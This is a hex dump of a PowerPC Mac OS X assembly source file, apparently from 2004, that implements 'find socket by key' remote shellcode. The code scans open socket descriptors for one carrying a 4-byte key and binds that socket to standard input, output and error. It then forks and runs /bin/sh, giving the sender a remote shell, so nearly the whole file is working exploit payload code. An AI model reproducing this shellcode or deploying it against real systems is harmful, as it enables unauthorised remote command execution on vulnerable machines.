00000000  3b 3b 3b 0d 0a 3b 3b 3b  20 50 6f 77 65 72 50 43  |;;;..;;; PowerPC|
00000010  20 4f 53 58 20 72 65 6d  6f 74 65 20 66 69 6e 64  | OSX remote find|
00000020  73 6f 63 6b 20 62 79 20  72 65 63 76 28 29 20 6b  |sock by recv() k|
00000030  65 79 20 73 68 65 6c 6c  63 6f 64 65 0d 0a 3b 3b  |ey shellcode..;;|
00000040  3b 0d 0a 3b 3b 3b 20 44  69 6e 6f 20 44 61 69 20  |;..;;; Dino Dai |
00000050  5a 6f 76 69 20 3c 20 64  64 7a 40 74 68 65 74 61  |Zovi < ddz@theta|
00000060  34 34 2e 6f 72 67 20 3e  2c 20 32 30 30 34 30 38  |44.org >, 200408|
00000070  31 36 0d 0a 3b 3b 3b 0d  0a 0d 0a 2e 67 6c 6f 62  |16..;;;.....glob|
00000080  6c 20 5f 73 68 65 6c 6c  63 6f 64 65 0d 0a 2e 74  |l _shellcode...t|
00000090  65 78 74 0d 0a 0d 0a 2e  73 65 74 20 4b 45 59 2c  |ext.....set KEY,|
000000a0  20 30 78 35 38 35 38 35  38 30 61 0d 0a 2e 73 65  | 0x5858580a...se|
000000b0  74 20 50 54 48 52 45 41  44 5f 45 58 49 54 2c 20  |t PTHREAD_EXIT, |
000000c0  30 78 39 30 30 31 37 30  32 31 09 3b 20 4f 53 58  |0x90017021.; OSX|
000000d0  20 31 30 2e 33 2e 58 0d  0a 0d 0a 5f 73 68 65 6c  | 10.3.X...._shel|
000000e0  6c 63 6f 64 65 3a 0d 0a  4c 66 69 6e 64 73 6f 63  |lcode:..Lfindsoc|
000000f0  6b 3a 0d 0a 09 61 64 64  69 73 09 72 32 37 2c 20  |k:...addis.r27, |
00000100  30 2c 20 68 69 31 36 28  4b 45 59 29 0d 0a 09 6f  |0, hi16(KEY)...o|
00000110  72 69 09 72 32 37 2c 20  72 32 37 2c 20 6c 6f 31  |ri.r27, r27, lo1|
00000120  36 28 4b 45 59 29 0d 0a  09 61 64 64 69 73 09 72  |6(KEY)...addis.r|
00000130  33 31 2c 20 30 2c 20 68  69 31 36 28 30 78 66 66  |31, 0, hi16(0xff|
00000140  66 66 30 30 30 30 29 0d  0a 09 73 72 61 77 69 09  |ff0000)...srawi.|
00000150  72 33 31 2c 20 72 33 31  2c 20 31 31 0d 0a 09 6d  |r31, r31, 11...m|
00000160  74 63 74 72 09 72 33 31  0d 0a 0d 0a 09 3b 3b 20  |tctr.r31.....;; |
00000170  43 6f 75 6e 74 20 64 6f  77 6e 20 73 6f 63 6b 65  |Count down socke|
00000180  74 73 20 62 61 63 6b 77  61 72 64 73 20 69 6e 20  |ts backwards in |
00000190  68 6f 70 65 73 20 6f 66  20 67 65 74 74 69 6e 67  |hopes of getting|
000001a0  20 6f 75 72 20 6d 6f 73  74 20 72 65 63 65 6e 74  | our most recent|
000001b0  0d 0a 09 3b 3b 20 63 6f  6e 6e 65 63 74 69 6f 6e  |...;; connection|
000001c0  20 28 69 66 20 77 65 20  68 61 76 65 20 6d 75 6c  | (if we have mul|
000001d0  74 69 70 6c 65 29 2e 0d  0a 4c 30 3a 09 6d 66 63  |tiple)...L0:.mfc|
000001e0  74 72 09 72 33 0d 0a 09  61 64 64 69 09 72 33 2c  |tr.r3...addi.r3,|
000001f0  20 72 33 2c 20 2d 31 09  3b 20 72 33 20 3d 20 73  | r3, -1.; r3 = s|
00000200  6f 63 6b 65 74 20 66 69  6c 65 20 64 65 73 63 72  |ocket file descr|
00000210  69 70 74 6f 72 0d 0a 0d  0a 09 61 64 64 69 09 72  |iptor.....addi.r|
00000220  34 2c 20 72 31 2c 20 2d  34 09 3b 20 72 34 20 3d  |4, r1, -4.; r4 =|
00000230  20 73 74 61 63 6b 20 62  75 66 66 65 72 0d 0a 09  | stack buffer...|
00000240  73 75 62 09 72 35 2c 20  72 31 2c 20 72 34 09 3b  |sub.r5, r1, r4.;|
00000250  20 72 35 20 3d 20 34 0d  0a 09 6c 69 09 72 36 2c  | r5 = 4...li.r6,|
00000260  20 30 78 34 31 34 30 0d  0a 09 73 72 61 77 69 09  | 0x4140...srawi.|
00000270  72 36 2c 20 72 36 2c 20  37 09 3b 20 72 36 20 3d  |r6, r6, 7.; r6 =|
00000280  20 4d 53 47 5f 50 45 45  4b 20 7c 20 4d 53 47 5f  | MSG_PEEK | MSG_|
00000290  44 4f 4e 54 57 41 49 54  0d 0a 09 61 64 64 69 09  |DONTWAIT...addi.|
000002a0  72 37 2c 20 72 35 2c 20  2d 34 09 3b 20 72 37 20  |r7, r5, -4.; r7 |
000002b0  3d 20 30 0d 0a 09 61 64  64 69 09 72 38 2c 20 72  |= 0...addi.r8, r|
000002c0  35 2c 20 2d 34 09 3b 20  72 38 20 3d 20 30 0d 0a  |5, -4.; r8 = 0..|
000002d0  09 6c 69 09 72 33 30 2c  20 30 78 33 61 66 66 0d  |.li.r30, 0x3aff.|
000002e0  0a 09 73 72 61 77 69 09  72 30 2c 20 72 33 30 2c  |..srawi.r0, r30,|
000002f0  20 39 09 3b 20 6c 6f 61  64 20 73 79 73 63 61 6c  | 9.; load syscal|
00000300  6c 20 6e 75 6d 62 65 72  20 69 6e 74 6f 20 72 30  |l number into r0|
00000310  0d 0a 09 63 6d 70 6c 77  09 72 32 39 2c 20 72 32  |...cmplw.r29, r2|
00000320  39 0d 0a 0d 0a 09 2e 6c  6f 6e 67 09 30 78 34 34  |9......long.0x44|
00000330  66 66 66 66 30 32 09 3b  20 72 65 63 76 66 72 6f  |ffff02.; recvfro|
00000340  6d 28 73 2c 20 62 75 66  2c 20 34 2c 20 30 78 38  |m(s, buf, 4, 0x8|
00000350  32 2c 20 30 2c 20 30 29  0d 0a 09 62 64 6e 7a 74  |2, 0, 0)...bdnzt|
00000360  09 65 71 2c 20 4c 30 0d  0a 09 3b 3b 20 4f 6e 20  |.eq, L0...;; On |
00000370  73 79 73 63 61 6c 6c 20  65 72 72 6f 72 2c 20 61  |syscall error, a|
00000380  74 74 65 6d 70 74 20 63  6f 6d 70 61 72 65 20 61  |ttempt compare a|
00000390  6e 79 77 61 79 20 61 6e  64 20 6c 6f 6f 70 0d 0a  |nyway and loop..|
000003a0  09 0d 0a 09 6c 77 7a 09  72 32 38 2c 20 2d 34 28  |....lwz.r28, -4(|
000003b0  72 31 29 0d 0a 09 63 6d  70 6c 77 09 72 32 38 2c  |r1)...cmplw.r28,|
000003c0  20 72 32 37 0d 0a 09 62  64 6e 7a 66 09 65 71 2c  | r27...bdnzf.eq,|
000003d0  20 4c 30 0d 0a 09 3b 3b  3b 20 41 74 20 74 68 69  | L0...;;; At thi|
000003e0  73 20 70 6f 69 6e 74 20  6f 75 72 20 73 6f 63 6b  |s point our sock|
000003f0  65 74 20 66 64 20 69 73  20 69 6e 20 63 74 72 0d  |et fd is in ctr.|
00000400  0a 0d 0a 3b 3b 3b 0d 0a  3b 3b 3b 20 64 75 70 32  |...;;;..;;; dup2|
00000410  28 32 29 20 6f 75 72 20  73 6f 63 6b 65 74 20 28  |(2) our socket (|
00000420  69 6e 20 63 74 72 29 20  74 6f 20 73 74 64 69 6e  |in ctr) to stdin|
00000430  2c 20 73 74 64 6f 75 74  2c 20 73 74 64 65 72 72  |, stdout, stderr|
00000440  0d 0a 3b 3b 3b 20 09 0d  0a 4c 64 75 70 5f 66 64  |..;;; ...Ldup_fd|
00000450  73 3a 0d 0a 09 6c 69 09  72 33 30 2c 20 30 78 32  |s:...li.r30, 0x2|
00000460  64 30 31 0d 0a 09 73 72  61 77 69 09 72 30 2c 20  |d01...srawi.r0, |
00000470  72 33 30 2c 20 37 0d 0a  09 6c 69 09 72 33 30 2c  |r30, 7...li.r30,|
00000480  20 30 78 36 36 36 0d 0a  09 73 72 61 77 69 09 72  | 0x666...srawi.r|
00000490  33 30 2c 20 72 33 30 2c  20 39 0d 0a 09 0d 0a 09  |30, r30, 9......|
000004a0  6d 66 63 74 72 09 72 33  0d 0a 09 61 64 64 69 09  |mfctr.r3...addi.|
000004b0  72 34 2c 20 72 33 30 2c  20 2d 31 0d 0a 09 2e 6c  |r4, r30, -1....l|
000004c0  6f 6e 67 09 30 78 34 34  66 66 66 66 30 32 09 3b  |ong.0x44ffff02.;|
000004d0  20 64 75 70 32 28 73 6f  63 6b 2c 20 32 29 0d 0a  | dup2(sock, 2)..|
000004e0  09 2e 6c 6f 6e 67 09 30  78 37 63 38 34 32 30 30  |..long.0x7c84200|
000004f0  38 0d 0a 09 0d 0a 09 6d  66 63 74 72 09 72 33 0d  |8......mfctr.r3.|
00000500  0a 09 61 64 64 69 09 72  34 2c 20 72 33 30 2c 20  |..addi.r4, r30, |
00000510  2d 32 0d 0a 09 2e 6c 6f  6e 67 09 30 78 34 34 66  |-2....long.0x44f|
00000520  66 66 66 30 32 09 3b 20  64 75 70 32 28 73 6f 63  |fff02.; dup2(soc|
00000530  6b 2c 20 31 29 0d 0a 09  2e 6c 6f 6e 67 09 30 78  |k, 1)....long.0x|
00000540  37 63 38 34 32 30 30 38  09 0d 0a 09 0d 0a 09 6d  |7c842008.......m|
00000550  66 63 74 72 09 72 33 0d  0a 09 61 64 64 69 09 72  |fctr.r3...addi.r|
00000560  34 2c 20 72 33 30 2c 20  2d 33 0d 0a 09 2e 6c 6f  |4, r30, -3....lo|
00000570  6e 67 09 30 78 34 34 66  66 66 66 30 32 09 3b 20  |ng.0x44ffff02.; |
00000580  64 75 70 32 28 73 6f 63  6b 2c 20 30 29 0d 0a 09  |dup2(sock, 0)...|
00000590  2e 6c 6f 6e 67 09 30 78  37 63 38 34 32 30 30 38  |.long.0x7c842008|
000005a0  0d 0a 0d 0a 3b 3b 3b 0d  0a 3b 3b 3b 20 56 46 6f  |....;;;..;;; VFo|
000005b0  72 6b 69 6e 67 20 73 68  65 6c 6c 63 6f 64 65 20  |rking shellcode |
000005c0  2d 20 43 61 6c 6c 20 76  66 6f 72 6b 28 29 20 61  |- Call vfork() a|
000005d0  6e 64 20 65 78 65 63 75  74 65 20 2f 62 69 6e 2f  |nd execute /bin/|
000005e0  73 68 20 69 6e 20 63 68  69 6c 64 20 70 72 6f 63  |sh in child proc|
000005f0  65 73 73 2e 20 20 0d 0a  3b 3b 3b 20 49 6e 20 70  |ess.  ..;;; In p|
00000600  61 72 65 6e 74 2c 20 77  65 20 65 78 65 63 20 22  |arent, we exec "|
00000610  2f 62 69 6e 2f 73 69 22  20 28 22 2f 62 69 6e 2f  |/bin/si" ("/bin/|
00000620  73 68 22 20 2b 20 31 29  2c 20 66 61 69 6c 2c 20  |sh" + 1), fail, |
00000630  61 6e 64 20 72 75 6e 20  74 68 65 20 63 6f 64 65  |and run the code|
00000640  20 74 68 61 74 20 0d 0a  3b 3b 3b 20 66 6f 6c 6c  | that ..;;; foll|
00000650  6f 77 73 20 74 68 65 20  65 78 65 63 76 65 28 29  |ows the execve()|
00000660  2e 0d 0a 3b 3b 3b 0d 0a  4c 66 6f 72 6b 5f 65 78  |...;;;..Lfork_ex|
00000670  65 63 76 65 5f 62 69 6e  73 68 3a 0d 0a 20 20 20  |ecve_binsh:..   |
00000680  20 20 20 20 20 3b 3b 20  63 61 6c 6c 20 76 66 6f  |     ;; call vfo|
00000690  72 6b 20 28 6e 65 63 65  73 73 61 72 79 20 74 6f  |rk (necessary to|
000006a0  20 65 78 65 63 20 69 6e  20 74 68 72 65 61 64 65  | exec in threade|
000006b0  64 20 70 72 6f 67 72 61  6d 73 29 0d 0a 09 6c 69  |d programs)...li|
000006c0  09 72 33 30 2c 20 30 78  34 32 66 66 0d 0a 09 73  |.r30, 0x42ff...s|
000006d0  72 61 77 69 09 72 30 2c  20 72 33 30 2c 20 38 20  |rawi.r0, r30, 8 |
000006e0  0d 0a 09 2e 6c 6f 6e 67  09 30 78 34 34 66 66 66  |....long.0x44fff|
000006f0  66 30 32 0d 0a 09 2e 6c  6f 6e 67 09 30 78 37 63  |f02....long.0x7c|
00000700  38 34 32 30 30 38 0d 0a  0d 0a 20 09 78 6f 72 09  |842008.... .xor.|
00000710  72 33 31 2c 20 72 33 31  2c 20 72 33 31 0d 0a 20  |r31, r31, r31.. |
00000720  09 6c 69 73 09 72 33 30  2c 20 30 78 32 66 32 66  |.lis.r30, 0x2f2f|
00000730  0d 0a 20 09 61 64 64 69  09 72 33 30 2c 20 72 33  |.. .addi.r30, r3|
00000740  30 2c 20 30 78 37 33 36  37 0d 0a 09 61 64 64 09  |0, 0x7367...add.|
00000750  72 33 30 2c 20 72 33 30  2c 20 72 34 09 3b 20 49  |r30, r30, r4.; I|
00000760  6e 20 63 68 69 6c 64 2c  20 24 72 34 20 73 68 6f  |n child, $r4 sho|
00000770  75 6c 64 20 62 65 20 7a  65 72 6f 0d 0a 20 09 6c  |uld be zero.. .l|
00000780  69 73 09 72 32 39 2c 20  30 78 32 66 36 32 0d 0a  |is.r29, 0x2f62..|
00000790  20 09 61 64 64 69 09 72  32 39 2c 20 72 32 39 2c  | .addi.r29, r29,|
000007a0  20 30 78 36 39 36 65 0d  0a 09 78 6f 72 09 72 32  | 0x696e...xor.r2|
000007b0  38 2c 20 72 32 38 2c 20  72 32 38 0d 0a 09 61 64  |8, r28, r28...ad|
000007c0  64 69 09 72 32 37 2c 20  72 31 2c 20 2d 31 32 0d  |di.r27, r1, -12.|
000007d0  0a 20 09 73 74 6d 77 09  72 32 37 2c 20 2d 31 32  |. .stmw.r27, -12|
000007e0  28 72 31 29 09 3b 20 2d  31 32 20 69 73 20 61 72  |(r1).; -12 is ar|
000007f0  62 69 74 72 61 72 79 20  6e 75 6c 6c 2d 65 6c 69  |bitrary null-eli|
00000800  64 69 6e 67 20 63 6f 6e  73 74 61 6e 74 0d 0a 0d  |ding constant...|
00000810  0a 20 09 61 64 64 69 09  72 34 2c 20 72 31 2c 20  |. .addi.r4, r1, |
00000820  2d 31 32 0d 0a 09 61 64  64 69 09 72 33 2c 20 72  |-12...addi.r3, r|
00000830  31 2c 20 2d 34 0d 0a 20  09 78 6f 72 09 72 35 2c  |1, -4.. .xor.r5,|
00000840  20 72 35 2c 20 72 35 0d  0a 20 09 6c 69 09 72 33  | r5, r5.. .li.r3|
00000850  30 2c 20 33 30 32 30 39  0d 0a 20 09 73 72 61 77  |0, 30209.. .sraw|
00000860  69 09 72 30 2c 20 72 33  30 2c 20 39 09 3b 20 72  |i.r0, r30, 9.; r|
00000870  30 20 3d 20 35 39 0d 0a  20 09 2e 6c 6f 6e 67 09  |0 = 59.. ..long.|
00000880  30 78 34 34 66 66 66 66  30 32 09 3b 20 65 78 65  |0x44ffff02.; exe|
00000890  63 76 65 28 70 61 74 68  2c 20 61 72 67 76 2c 20  |cve(path, argv, |
000008a0  4e 55 4c 4c 29 0d 0a 4c  70 61 72 65 6e 74 3a 0d  |NULL)..Lparent:.|
000008b0  0a 0d 0a 3b 3b 3b 0d 0a  3b 3b 3b 20 43 61 6c 6c  |...;;;..;;; Call|
000008c0  20 70 74 68 72 65 61 64  5f 65 78 69 74 20 69 6e  | pthread_exit in|
000008d0  20 70 61 72 65 6e 74 20  70 72 6f 63 65 73 73 0d  | parent process.|
000008e0  0a 3b 3b 3b 0d 0a 4c 70  74 68 65 78 69 74 3a 0d  |.;;;..Lpthexit:.|
000008f0  0a 09 61 64 64 69 73 09  72 33 31 2c 20 30 2c 20  |..addis.r31, 0, |
00000900  68 69 31 36 28 50 54 48  52 45 41 44 5f 45 58 49  |hi16(PTHREAD_EXI|
00000910  54 29 20 3b 20 70 74 68  72 65 61 64 5f 65 78 69  |T) ; pthread_exi|
00000920  74 0d 0a 09 6f 72 69 09  72 33 31 2c 20 72 33 31  |t...ori.r31, r31|
00000930  2c 20 6c 6f 31 36 28 50  54 48 52 45 41 44 5f 45  |, lo16(PTHREAD_E|
00000940  58 49 54 29 0d 0a 09 6d  74 63 74 72 09 72 33 31  |XIT)...mtctr.r31|
00000950  0d 0a 09 62 63 74 72 6c                           |...bctrl|
00000958
